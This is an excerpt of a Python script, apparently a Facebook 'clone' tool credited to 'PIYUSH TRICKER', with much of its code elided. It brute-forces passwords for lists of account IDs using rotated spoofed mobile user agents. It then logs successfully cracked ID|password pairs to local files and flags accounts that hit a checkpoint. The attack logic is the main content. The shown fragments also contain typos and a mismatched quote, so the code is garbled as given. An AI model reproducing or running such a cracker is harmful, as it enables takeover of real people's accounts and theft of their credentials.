__Tools Owner PIYUSH TRICKER 
# https://github.com/PIYUSH A2Z TRICKS 
# Python 3.11 ___WhatsApp 917043592870
...
def crack(idf,pwv):
	...
	sys.stdout.write('\r %s[ PIYUSH ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print( f'\r\x1b[1;91m [ PIYUSH-CP ] {idf} | {pw}')
				...
				print(f'\r\x1b[1;92m [ PIYUSH-OK ] {idf} | {pw}')
	...
	for pw in pwv:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				rint( f'\r\x1b[1;91m [ PIYUSH-CP ] {idf} | {pw}')
				...
				open('/sdcard/PIYUSH-OK.txt','a').write('%s\n' % wrt)
...
class Main:
	...
	def __init__(self):
		...
		print("\033[1;32m➥[6]\033[1;32m𓆩CLONE 2005-6𓆪 ")
		print("\033[1;36m➥[7]\033[1;32m𓆩2008 CLONING𓆪\033[1;36m[NEW UPDATE]")
	...
	def api(self, uid, pwx):
		...
		rua = random.choice([
			"Mozilla/5.0 (Linux; Android 14; Infinix X6850B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.95 Mobile Safari/537.36 ",
"Mozilla/5.0 (Linux; Android 14; Infinix X6850B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.95 Mobile Safari/537.36 ",
'Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.95 Mobile Safari/537.36 ",
"Mozilla/5.0 (Linux; Android 13; Infinix X6820 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.95 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/479.0.0.42.89;] ",
"Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/128.0.6613.95 Mobile Safari/537.36 "
		])

		sys.stdout.write(

			"\r [ PIYUSH ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[ PIYUSH-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print("\r \033[0;92m[ PIYUSH-UA] %s | %s\033[0;97m         "%(rua))				

				print ("\r \033[0;92m Congrats Bro ")

				self.ok.append("%s|%s"%(uid, pw))

				open("2009-PIYUSH-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
